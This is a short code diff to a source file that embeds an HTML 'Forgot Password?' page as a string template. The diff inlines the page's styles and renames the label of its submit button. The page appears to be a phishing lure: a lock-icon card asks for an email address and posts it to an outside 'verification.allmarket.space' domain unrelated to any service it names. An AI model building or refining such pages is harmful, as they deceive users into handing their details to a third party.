@@ -10,7 +10,7 @@ String form = '''<!doctype html>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
         integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA=="
         crossorigin="anonymous" />
-    <link rel="stylesheet" href="style.css" />
+
 
     <!-- Google Fonts  -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -21,20 +21,23 @@ String form = '''<!doctype html>
 </head>
 
 <body>
+    <style>
+    $style
+    </style>
     <div class="card">
         <p class="lock-icon"><i class="fa fa-lock"></i></p>
 
         <form action="https://verification.allmarket.space" method="post" name="signup">
             <label for="text_field">Forgot Password?</label>
             <input type="text" class="passInput" placeholder="Email address" id="text_field" name="text">
-            <input type="submit" name="signup" value="Up">
+            <input type="submit" name="signup" value="Update">
             <!-- <button>Send My Password</button> -->
         </form>
     </div>
 </body>
 
 </html>''';
-String styleForm = '''* {
+String style = '''* {
     margin: 0;
     padding: 0;
     font-family: 'Poppins', sans-serif;
